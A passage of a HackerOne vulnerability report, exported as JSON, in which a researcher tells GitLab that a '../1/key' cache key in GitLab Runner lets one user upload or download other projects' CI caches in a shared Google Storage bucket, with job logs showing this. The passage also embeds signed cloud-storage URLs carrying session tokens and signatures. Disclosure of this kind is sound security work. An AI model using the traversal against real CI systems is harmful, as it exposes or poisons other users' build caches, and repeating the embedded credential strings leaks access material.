7fca3e05499ed3958ad039dbe75b53405a6cd83c90f0a6986030bdfee","file_size":179835,"type":"image/png"},{"id":345821,"file_name":"upload.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/821/a71d8b22d2076e221505ab76a8f8dc53fff39ffe/upload.png?response-content-disposition=attachment%3B%20filename%3D%22upload.png%22%3B%20filename%2A%3DUTF-8%27%27upload.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055248Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=ba084048bb0e05b8a9ee5670b2e4c0dde01fac7bc3980f6333454ef2c690559c","file_size":332866,"type":"image/png"}],"allow_singular_disclosure_at":"2019-04-10T04:33:41.953Z","allow_singular_disclosure_after":-54350346.82474158,"singular_disclosure_allowed":true,"vote_count":345,"voters":["j4v40n654n","lmy375","sky003","irek","nytr0gen","arneswinnen","saltyyolk","hipotermia","bulbu1play3r","pomme","and 335 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3334240,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ngalog  ,\n\nThank you for submitting this report. We are currently investigating the issue. Due to our current workload, we will get back within the next week with an update.\n\nBest regards,\nJames\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ngalog\"\u003e@ngalog\u003c/a\u003e  ,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We are currently investigating the issue. Due to our current workload, we will get back within the next week with an update.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-13T21:20:37.172Z","updated_at":"2018-09-13T21:20:37.172Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3342536,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Btw, is open redirect in scope?\n\nThanks,\nRon","markdown_message":"\u003cp\u003eBtw, is open redirect in scope?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nRon\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-16T02:00:44.191Z","updated_at":"2018-09-16T02:00:53.909Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3350221,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @ngalog ,\n\nI've followed your PoC steps but it's not able to fetch the cache for ID 1 or any other IDs I specify. Are there any other required steps to reproduce this?\n\n```\nRunning with gitlab-runner 11.3.0-rc1 (861c565e)\n  on docker-auto-scale 72989761\nUsing Docker executor with image ruby:2.5 ...\nPulling docker image ruby:2.5 ...\nUsing docker image sha256:88666731c3e1e55f7f1e3ccd617357480168f7b81578e1f60ced512d4e17ca90 for ruby:2.5 ...\nRunning on runner-72989761-project-8425371-concurrent-0 via runner-72989761-srm-1537207319-886e6cd2...\nCloning repository...\nCloning into '/builds/jritchey/adsf'...\nChecking out 9b9aa481 as master...\nSkipping Git submodules setup\nChecking cache for ../1/key...\nFATAL: file does not exist                         \nFailed to extract cache\n$ echo \"script\"\nscript\n$ echo \"a\"\na\nNot uploading cache ../1/key due to policy\nJob succeeded\n```\n\nYes, open redirect issues are in scope.\n\nBest regards,\nJames\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ngalog\"\u003e@ngalog\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve followed your PoC steps but it\u0026#39;s not able to fetch the cache for ID 1 or any other IDs I specify. Are there any other required steps to reproduce this?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eRunning with gitlab-runner 11.3.0-rc1 (861c565e)\n  on docker-auto-scale 72989761\nUsing Docker executor with image ruby:2.5 ...\nPulling docker image ruby:2.5 ...\nUsing docker image sha256:88666731c3e1e55f7f1e3ccd617357480168f7b81578e1f60ced512d4e17ca90 for ruby:2.5 ...\nRunning on runner-72989761-project-8425371-concurrent-0 via runner-72989761-srm-1537207319-886e6cd2...\nCloning repository...\nCloning into \u0026#39;/builds/jritchey/adsf\u0026#39;...\nChecking out 9b9aa481 as master...\nSkipping Git submodules setup\nChecking cache for ../1/key...\nFATAL: file does not exist                         \nFailed to extract cache\n$ echo \u0026quot;script\u0026quot;\nscript\n$ echo \u0026quot;a\u0026quot;\na\nNot uploading cache ../1/key due to policy\nJob succeeded\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYes, open redirect issues are in scope.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-17T18:11:29.852Z","updated_at":"2018-09-17T18:11:29.852Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8037454,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":null,"markdown_message":"","automated_response":false,"created_at":"2018-09-17T22:16:42.006Z","updated_at":"2020-05-18T15:23:55.465Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3351193,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi James,\n\nI think this bug has escalated to a higher severity, the reason is on Sep 13th, when I trigger CI/CD, the cache is uploaded to internal gitlab url, but when I do it today, the cache is `pushed/pulled` `to/from` `https://storage.googleapis.com/`\n\nPart of job logs when user @golduserngalog push cache to ../1/key to storage.googleapis.com\n\n```\n++ /usr/bin/gitlab-runner-helper cache-archiver --file ../../../cache/golduserngalog/1/key/cache.zip --timeout 10 --path . --url 'https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key?Expires=1537225143\u0026GoogleAccessId=runners-cache%40gitlab-ci-155816.iam.gserviceaccount.com\u0026Signature=lJ5OCDRLA8e8UOzUFpoeq3q%2BEeD8HGzP5gq2Uflanw1zDphOjFEuFD%2FEOkBqDK1181a8V2k5o16mbhAuimCKLlPyumMc0vU%2B%2B3IPa1P6MmaO7WIRTmWwPtF42F%2BSmxvMzxf0eYxmFGA%2FWcXf0dyQL3La4Gj0cF92XAjMwJAcJXyCe7awlk8GO3Y30RLVqta7sv6lhbKVCmMgXYV7OC0z4J7awrh9rol2C7zV4f2T3SIF7XwFTIkskJQEt9gbCIH7k5Z64%2FT%2F%2BEHbfrM5d9GjB%2FBUIeeLUFSzPCjatz49%2B13kHwUEB1TGGMQlIq2DZDfljLSqptluByPNSwMAG63vzQ%3D%3D'\n.: found 67 matching files\nRNING: Part of .git directory is on the list of files to archive\nh\nading cache.zip to https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key\nCreated cache\n\n```\n\nPart of job logs when user @ngalongc pull cache ../1/key from storage.googleapis.com\n\n```\n\n++ /usr/bin/gitlab-runner-helper cache-extractor --file ../../../cache/ngalongc/1/key/cache.zip --timeout 10 --url 'https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key?Expires=1537225641\u0026GoogleAccessId=runners-cache%40gitlab-ci-155816.iam.gserviceaccount.com\u0026Signature=YQFV2mLJ7rtWESllr7h%2BTU63n%2Bk3lrS2ggm7izfxoeOBXte5w8RMXSN0LdL%2FqM4ZFdldrEfUXeQDvOJLCXq7UdhNovTn63mrjnNGZnP5La9ApKzETLkrejEXsILoWFMysS1%2FXuKkD2FljaUxTiIE0etU1HbT1HCwR%2BSqkY65Kwpjq6UWIM8ehnuHZD1CKdx2M7wndjbdaWgaaWIcfGHndI5KycZUooRPrkr8ZcbTIxkj2SbYwoR0dL4ua3pGKtTm%2BbH29JSxylHXkv%2BMx12l%2FM5XJG4chojyecc1IFzqiinQGl2ytJD3PxjKKRYW5z8lR1ZTdGhQuUkYtUm8jmPctw%3D%3D'\nDownloading cache.zip from https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key\nRNING: Part of .git directory is on the list of files to extract\nRNING: This may introduce unexpected problems\nSuccessfully extracted cache\n```\n\n\n\nThe reason that you couldnt make it work because i was pushing to gitlab internal cache system, but if you do it again now with the same exact steps, you will be able to pull the ../1/key, because now i have pushed to the path ../1/key\n\nAlso, the updated impact is I can upload or download any thing under https://storage.googleapis.com/gitlab-com-runners-cache/\n\nYou can search in the log for `storage.googleapis.com` and you will understand this is possible\n\nFinally, in the mean time I will explore how could I trigger the directory listing of storage.googleapis.com to avoid blindly guessing the cache key and project id, I will update here if I succeed.\n\n{F347517}","markdown_message":"\u003cp\u003eHi James,\u003c/p\u003e\n\n\u003cp\u003eI think this bug has escalated to a higher severity, the reason is on Sep 13th, when I trigger CI/CD, the cache is uploaded to internal gitlab url, but when I do it today, the cache is \u003ccode\u003epushed/pulled\u003c/code\u003e \u003ccode\u003eto/from\u003c/code\u003e \u003ccode\u003ehttps://storage.googleapis.com/\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ePart of job logs when user \u003ca href=\"/golduserngalog\"\u003e@golduserngalog\u003c/a\u003e push cache to ../1/key to storage.googleapis.com\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e++ /usr/bin/gitlab-runner-helper cache-archiver --file ../../../cache/golduserngalog/1/key/cache.zip --timeout 10 --path . --url \u0026#39;https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key?Expires=1537225143\u0026amp;GoogleAccessId=runners-cache%40gitlab-ci-155816.iam.gserviceaccount.com\u0026amp;Signature=lJ5OCDRLA8e8UOzUFpoeq3q%2BEeD8HGzP5gq2Uflanw1zDphOjFEuFD%2FEOkBqDK1181a8V2k5o16mbhAuimCKLlPyumMc0vU%2B%2B3IPa1P6MmaO7WIRTmWwPtF42F%2BSmxvMzxf0eYxmFGA%2FWcXf0dyQL3La4Gj0cF92XAjMwJAcJXyCe7awlk8GO3Y30RLVqta7sv6lhbKVCmMgXYV7OC0z4J7awrh9rol2C7zV4f2T3SIF7XwFTIkskJQEt9gbCIH7k5Z64%2FT%2F%2BEHbfrM5d9GjB%2FBUIeeLUFSzPCjatz49%2B13kHwUEB1TGGMQlIq2DZDfljLSqptluByPNSwMAG63vzQ%3D%3D\u0026#39;\n.: found 67 matching files\nRNING: Part of .git directory is on the list of files to archive\nh\nading cache.zip to https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key\nCreated cache\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePart of job logs when user \u003ca href=\"/ngalongc\"\u003e@ngalongc\u003c/a\u003e pull cache ../1/key from storage.googleapis.com\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\n++ /usr/bin/gitlab-runner-helper cache-extractor --file ../../../cache/ngalongc/1/key/cache.zip --timeout 10 --url \u0026#39;https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key?Expires=1537225641\u0026amp;GoogleAccessId=runners-cache%40gitlab-ci-155816.iam.gserviceaccount.com\u0026amp;Signature=YQFV2mLJ7rtWESllr7h%2BTU63n%2Bk3lrS2ggm7izfxoeOBXte5w8RMXSN0LdL%2FqM4ZFdldrEfUXeQDvOJLCXq7UdhNovTn63mrjnNGZnP5La9ApKzETLkrejEXsILoWFMysS1%2FXuKkD2FljaUxTiIE0etU1HbT1HCwR%2BSqkY65Kwpjq6UWIM8ehnuHZD1CKdx2M7wndjbdaWgaaWIcfGHndI5KycZUooRPrkr8ZcbTIxkj2SbYwoR0dL4ua3pGKtTm%2BbH29JSxylHXkv%2BMx12l%2FM5XJG4chojyecc1IFzqiinQGl2ytJD3PxjKKRYW5z8lR1ZTdGhQuUkYtUm8jmPctw%3D%3D\u0026#39;\nDownloading cache.zip from https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key\nRNING: Part of .git directory is on the list of files to extract\nRNING: This may introduce unexpected problems\nSuccessfully extracted cache\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe reason that you couldnt make it work because i was pushing to gitlab internal cache system, but if you do it again now with the same exact steps, you will be able to pull the ../1/key, because now i have pushed to the path ../1/key\u003c/p\u003e\n\n\u003cp\u003eAlso, the updated impact is I can upload or download any thing under \u003ca title=\"https://storage.googleapis.com/gitlab-com-runners-cache/\" href=\"/redirect?url=https%3A%2F%2Fstorage.googleapis.com%2Fgitlab-com-runners-cache%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://storage.googleapis.com/gitlab-com-runners-cache/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eYou can search in the log for \u003ccode\u003estorage.googleapis.com\u003c/code\u003e and you will understand this is possible\u003c/p\u003e\n\n\u003cp\u003eFinally, in the mean time I will explore how could I trigger the directory listing of storage.googleapis.com to avoid blindly guessing the cache key and project id, I will update here if I succeed.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"shouldnotbepossible.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/517/4a77b518b98d5531d68761abb1f4ce0e831b5b41/shouldnotbepossible.PNG?response-content-disposition=attachment%3B%20filename%3D%22shouldnotbepossible.PNG%22%3B%20filename%2A%3DUTF-8%27%27shouldnotbepossible.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=eaaedfc845138b0c6af9605aa7032f09ca2066349f04d09b4984c25dcc7803c3\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/517/4a77b518b98d5531d68761abb1f4ce0e831b5b41/shouldnotbepossible.PNG?response-content-disposition=attachment%3B%20filename%3D%22shouldnotbepossible.PNG%22%3B%20filename%2A%3DUTF-8%27%27shouldnotbepossible.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=eaaedfc845138b0c6af9605aa7032f09ca2066349f04d09b4984c25dcc7803c3\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-17T22:25:21.175Z","updated_at":"2018-09-17T22:30:31.565Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":347517,"filename":"shouldnotbepossible.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/517/4a77b518b98d5531d68761abb1f4ce0e831b5b41/shouldnotbepossible.PNG?response-content-disposition=attachment%3B%20filename%3D%22shouldnotbepossible.PNG%22%3B%20filename%2A%3DUTF-8%27%27shouldnotbepossible.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055248Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=eaaedfc845138b0c6af9605aa7032f09ca2066349f04d09b4984c25dcc7803c3"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3351633,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just found out that Google storage has no concept of directory, there is only object with `/` in the name, so directory listing is not possible in this situation.\n\nStill, this allow me to push/pull anything to the gitlab cache bucket `https://storage.googleapis.com/gitlab-com-runners-cache/` with arbitrary key\n\nThanks,\nRon","markdown_message":"\u003cp\u003eJust found out that Google storage has no concept of directory, there is only object with \u003ccode\u003e/\u003c/code\u003e in the name, so directory listing is not possible in this situation.\u003c/p\u003e\n\n\u003cp\u003eStill, this allow me to push/pull anything to the gitlab cache bucket \u003ccode\u003ehttps://storage.googleapis.com/gitlab-com-runners-cache/\u003c/code\u003e with arbitrary key\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nRon\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-18T02:01:51.505Z","updated_at":"2018-09-18T02:01:51.505Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3354762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ngalog ,\n\nThank you for the updates. We are working internally on investigating and mitigating the issue at https://gitlab.com/gitlab-org/gitlab-runner/issues/3589.\n\nThe issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\n\nBest regards,\nJames","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ngalog\"\u003e@ngalog\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for the updates. We are working internally on investigating and mitigating the issue at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-runner/issues/3589\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-runner%2Fissues%2F3589\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-runner/issues/3589\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\u003c/p\u003e\n\n\u003cp\u003eBest 